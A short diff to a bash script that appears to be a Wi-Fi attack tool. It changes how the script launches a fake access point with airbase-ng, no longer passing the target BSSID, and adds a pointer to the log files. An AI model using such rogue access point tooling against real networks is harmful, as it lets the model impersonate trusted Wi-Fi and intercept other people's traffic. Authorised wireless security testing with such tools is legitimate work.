@@ -712,7 +712,7 @@ main() {
                     print_header
                     echo ""
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting fake access point...${WHITE}"
-                    run_background "airbase-ng -e '${selected_essid}' -a ${selected_bssid} -c ${selected_channel} ${wlan}" "airbase-ng"
+                    run_background "airbase-ng -e '${selected_essid}' -c ${selected_channel} ${wlan}" "airbase-ng"
 
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Waiting for at0 interface...${WHITE}"
                     local at0_timeout=10
@@ -761,6 +761,7 @@ main() {
                     else
                         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Internet access: ${BOLD_RED}Disabled${WHITE}"
                     fi
+                    echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Check logs: ${BOLD_CYAN}./tmp/airbase-ng.log${GREEN}, ${BOLD_CYAN}./tmp/dhcpd.log${WHITE}"
                     echo ""
                     echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Press ${BOLD_YELLOW}Enter${GREEN} to stop the attack and clean up.${WHITE}"
                     read
